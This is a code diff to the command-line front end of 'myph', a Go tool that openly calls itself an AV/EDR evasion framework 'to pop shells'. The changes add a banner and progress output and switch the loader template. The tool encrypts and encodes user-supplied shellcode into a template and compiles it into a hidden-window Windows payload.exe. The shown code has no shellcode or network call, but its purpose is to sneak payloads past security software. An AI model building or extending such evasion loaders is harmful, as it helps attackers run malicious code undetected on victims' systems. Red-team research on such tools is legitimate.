@@ -10,15 +10,45 @@ import (
 	"github.com/spf13/cobra"
 )
 
+const ASCII_ART = `
+              ...                                    -==[ M Y P H ]==-
+             ;::::;
+           ;::::; :;                                In loving memory of
+         ;:::::'   :;                           Wassyl Iaroslavovytch Slipak
+        ;:::::;     ;.
+       ,:::::'       ;           OOO                   (1974 - 2016)
+       ::::::;       ;          OOOOO
+       ;:::::;       ;         OOOOOOOO
+      ,;::::::;     ;'         / OOOOOOO
+    ;::::::::: . ,,,;.        /  / DOOOOOO
+  .';:::::::::::::::::;,     /  /     DOOOO
+ ,::::::;::::::;;;;::::;,   /  /        DOOO        AV / EDR evasion framework
+; :::::: '::::::;;;::::: ,#/  /          DOOO           to pop shells and
+: ::::::: ;::::::;;::: ;::#  /            DOOO        make the blue team cry
+:: ::::::: ;:::::::: ;::::# /              DOO
+ : ::::::: ;:::::: ;::::::#/               DOO
+ ::: ::::::: ;; ;:::::::::##                OO       written with <3 by djnn
+ :::: ::::::: ;::::::::;:::#                OO                ------
+ ::::: ::::::::::::;' :;::#                O             https://djnn.sh
+   ::::: ::::::::;  /  /  :#
+   :::::: :::::;   /  /    #
+
+
+    `
+
+
 func GetParser(opts *Options) *cobra.Command {
+
 	version := "2.0.0"
 	var cmd = &cobra.Command{
 		Use:                "myph",
 		Version:            version,
 		DisableSuggestions: true,
-		Short:              "minimal golang loader",
-		Long:               `In loving memory of Wassyl Iaroslavovytch Slipak (1974 - 2016)`,
+		Short:              "AV/EDR evasion framework",
+		Long:               ASCII_ART,
 		Run: func(cmd *cobra.Command, args []string) {
+
+            fmt.Printf("%s\n\n", ASCII_ART)
 
 			if opts.ShellcodePath == "" {
 				fmt.Println("[!] Please specify your shellcode's path with --shellcode")
@@ -44,8 +74,12 @@ func GetParser(opts *Options) *cobra.Command {
 				opts.Key = tools.RandomString(32)
 			}
 
+            fmt.Printf("[+] Selected algorithm: %s (Key: %s)\n", opts.Encryption.String(), opts.Key)
+
 			/* encoding defines the way the series of bytes will be written into the template */
 			encType := tools.SelectRandomEncodingType()
+
+            fmt.Printf("\tEncoding into template with [%s]\n", encType.String())
 
 			/*
 			   depending on encryption type, we do the following:
@@ -92,10 +126,12 @@ func GetParser(opts *Options) *cobra.Command {
 			}
 
 			/* TODO: add support for more exec templates */
-			err = tools.WriteToFile(opts.Outdir, "exec.go", loaders.GetSyscallTemplate(opts.Target))
+			err = tools.WriteToFile(opts.Outdir, "exec.go", loaders.GetCRTTemplate(opts.Target))
 
 			os.Setenv("GOOS", opts.OS)
 			os.Setenv("GOARCH", opts.arch)
+
+            fmt.Printf("\n[+] Template (CRT) written to tmp directory. Compiling...\n")
 
 			execCmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
 			execCmd.Dir = opts.Outdir
@@ -107,7 +143,7 @@ func GetParser(opts *Options) *cobra.Command {
 				os.Exit(1)
 			}
 
-            println("[+] Done! You may find your payload in out directory...")
+            println("[+] Done! You may find your payload in the out-directory...")
 		},
 	}
 
@@ -121,7 +157,7 @@ func GetParser(opts *Options) *cobra.Command {
 	cmd.PersistentFlags().StringVarP(&opts.OS, "os", "o", defaults.OS, "OS compilation target")
 
 	cmd.PersistentFlags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, RSA, XOR)")
-	cmd.PersistentFlags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption-method)")
+	cmd.PersistentFlags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")
 
 	return cmd
 }
